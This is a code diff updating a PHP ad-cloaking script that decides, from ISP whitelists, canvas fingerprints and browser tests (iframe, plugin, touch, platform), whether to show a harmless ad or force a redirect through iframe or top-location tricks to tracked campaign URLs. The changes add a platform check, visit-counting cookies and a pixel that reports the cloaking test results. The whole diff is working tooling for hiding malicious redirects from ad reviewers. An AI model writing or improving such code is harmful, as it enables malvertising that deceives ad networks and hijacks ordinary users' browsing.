@@ -1,6 +1,6 @@
 <?php
 
-	$__VERSION = "5.6";
+	$__VERSION = "5.7";
 
 	if (array_key_exists("version", $_GET))
 	{
@@ -331,11 +331,19 @@
 		}		
 	}
 
+	// Redirect method windowtoplocationiframe, serve iframe with redirect url as content
 	if (array_key_exists("iframe", $_GET) && array_key_exists("data", $_GET))
 	{
 		echo "<html><body><iframe frameborder=\"0\" style=\"width:100%;height:100%;\" src=\"" . base64_decode($_GET["data"]) . "\"></iframe></body></html>";
 		exit;
 	}
+
+	/*
+		Cookies:
+		_c 					clickID
+		_v 					ad.php visits
+		_v<campaignID>		campaign visits
+	*/
 
 	// Set ad.php click ID cookie
 	$adClickID = uniqid("", true);
@@ -359,6 +367,10 @@
 		$queryString = "";
 	}
 
+	// ad.php camp visits
+	$adCampVisits = isset($_COOKIE["_v" . $campaignID]) ? $_COOKIE["_v" . $campaignID] + 1 : 1;
+	setcookie("_v" . $campaignID, $adCampVisits, strtotime("+1 year"));	
+
 	handleTrafficLoggerData($campaignID);
 
 	$configFilename  = "ads/" . $campaignID . ".config.txt";
@@ -376,8 +388,8 @@
 	$redirectSubMethod2				= array_key_exists("RedirectSubMethod2", $adConfig) ? $adConfig["RedirectSubMethod2"] : "";
 	$redirectTimeout 				= array_key_exists("RedirectTimeout", $adConfig) ? $adConfig["RedirectTimeout"] : 3000;
 	$redirectEnabled				= array_key_exists("RedirectEnabled", $adConfig) && $adConfig["RedirectEnabled"] === "false" ? false : true;
-	$voluumNumberOfAds				= array_key_exists("VoluumNumberOfAds", $adConfig) ? $adConfig["VoluumNumberOfAds"] : -1;
-	$voluumAdCycleCount				= array_key_exists("VoluumAdCycleCount", $adConfig) ? $adConfig["VoluumAdCycleCount"] : -1;
+	$voluumTotalAds					= array_key_exists("VoluumTotalAds", $adConfig) ? $adConfig["VoluumTotalAds"] : -1;
+	$voluumAdDisplayCap				= array_key_exists("VoluumAdDisplayCap", $adConfig) ? $adConfig["VoluumAdDisplayCap"] : -1;
 	$adCountry 						= array_key_exists("CountryCode", $adConfig) ? $adConfig["CountryCode"] : "";
 	$allowedIspsPerCountry			= array_key_exists("AllowedISPS", $adConfig) && !empty($adConfig["AllowedISPS"]) ? array($adCountry => preg_split("/\|/", $adConfig["AllowedISPS"], -1, PREG_SPLIT_NO_EMPTY)) : $allowedIspsPerCountry;
 	$blacklistedProvinces 			= array_key_exists("ProvinceBlackList", $adConfig) ? preg_split("/\|/", $adConfig["ProvinceBlackList"], -1, PREG_SPLIT_NO_EMPTY) : array();
@@ -712,7 +724,8 @@
 		// Append referrer
 		$cloakTrackingPixelUrl = appendReferrerParameter($cloakTrackingPixelUrl);
 
-		$cloakTrackingPixelScript = getTrackingPixelCode("addCloakTrackingPixel", $cloakTrackingPixelUrl);
+		$cloakTrackingPixelScript = getTrackingPixelCode("addCloakTrackingPixel", $cloakTrackingPixelUrl, 
+			"(typeof testResults != 'undefined' ? ('&' + (testResults.isTouchTest ? 'touchSuccess=' + encodeURIComponent(getReferrerDomain()) : 'touchFailed=' + encodeURIComponent(getReferrerDomain())) + '&' + (testResults.platformTest ? 'platformSuccess=' + window.navigator.platform : 'platformFailed=' + window.navigator.platform)) : '')");
 	}
 
 	if (($serveCleanAd || !$redirectEnabled) && !$forceDirtyAd)
@@ -771,9 +784,16 @@
 
 		$redirectUrl = appendParameterPrefix($redirectUrl) . "ccid=$adClickID";
 
-		if ($voluumNumberOfAds > 0 && $voluumAdCycleCount > 0)
+		if ($voluumTotalAds > 0 && $voluumAdDisplayCap > 0)
 		{
-			$redirectUrl = appendParameterPrefix($redirectUrl) . "ad=" . (((int)($adVisits / $voluumAdCycleCount) % $voluumNumberOfAds) + 1);
+			$calculatedAdIndex = (((int)($adCampVisits / $voluumAdDisplayCap) % $voluumTotalAds) + 1);
+
+			if ($loggingEnabled)
+			{
+				adlog($campaignID, $ip, $isp["isp"], "Ad Cycling: Camp Visits: $adCampVisits, Voluum Ad Display Cap: $voluumAdDisplayCap, Voluum Total Ads: $voluumTotalAds, Calculated Ad Index: $calculatedAdIndex");
+			}
+
+			$redirectUrl = appendParameterPrefix($redirectUrl) . "ad=582" . $calculatedAdIndex;
 		}
 
 		$f_apps_WeightList["iOS"] 		= getCSVContentAsArray($f_apps_iosBaseFilename . $adCountry . $csvFileSuffix);
@@ -825,12 +845,7 @@
 
 		$scriptCode = "<script type=\"text/javascript\">
 
-						var testResults = [];
-
-						function isTrue(value)
-						{
-							return value === true;
-						}
+						var testResults = {};
 
 						if (typeof jslog !== 'function')
 						{
@@ -838,11 +853,13 @@
 						}" .
 
 						($trackingPixelEnabled && !empty($trackingPixelUrl) ? $trackingPixelScript : "") .
+						($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? $cloakTrackingPixelScript : "") .
 
 					   	($iframeCloakingEnabled ? file_get_contents("js/iframetest.js") : "") .
 			   			($pluginCloakingEnabled ? file_get_contents("js/plugintest.js") : "") .
 			   			($touchCloakingEnabled ? file_get_contents("js/touchtest.js") : "") .
 						($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? file_get_contents("js/canvasfingerprinttest.js") : "") .
+						(true ? file_get_contents("js/platformtest.js") : "") .
 
 					   "
 					   	function inBlockedCanvasList()
@@ -869,29 +886,25 @@
 						function go()
 						{\n" .
 							($trackingPixelEnabled && !empty($trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
-						   	($iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
-				   			($pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
-				   			($touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
-							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .							
+						   	($iframeCloakingEnabled ? "testResults.inIFrameTest = (inIFrame());\n" : "") .
+				   			($pluginCloakingEnabled ? "testResults.hasPluginsTest = (!hasPlugins());\n" : "") .
+				   			($touchCloakingEnabled ? "testResults.isTouchTest = (isTouch());\n" : "") .
+							($canvasFingerprintCheckEnabled && !empty($blockedCanvasFingerprints) ? "testResults.isNotInBlockedCanvasListTest = (!inBlockedCanvasList());\n" : "") .
+							(true ? "testResults.platformTest = (platformTest());\n" : "") .
+							($cloakTrackingPixelEnabled && !empty($cloakTrackingPixelUrl) ? "addCloakTrackingPixel();\n" : "") . // added last because this uses JS test results
 						   "jslog(testResults);
 
-						   	if (testResults.every(isTrue))
+						   	var allTestResultsTrue = true;
+							Object.keys(testResults).forEach(function(key, index) { if (this[key] === false) { allTestResultsTrue = false; } }, testResults);
+
+						   	if (allTestResultsTrue)
 						   	{
-							   	/*if (/(iphone|linux armv)/i.test(window.navigator.platform))*/
-							    {
-									jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
-
-								    setTimeout(function()
-									{
-										var topDomain = getReferrerDomain();
-
-										$redirectCode
-									}, $redirectTimeout);
-								}
-								/*else*/
+							    setTimeout(function()
 								{
-									jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
-								}
+									var topDomain = getReferrerDomain();
+
+									$redirectCode
+								}, $redirectTimeout);
 							}
 					   	}
 
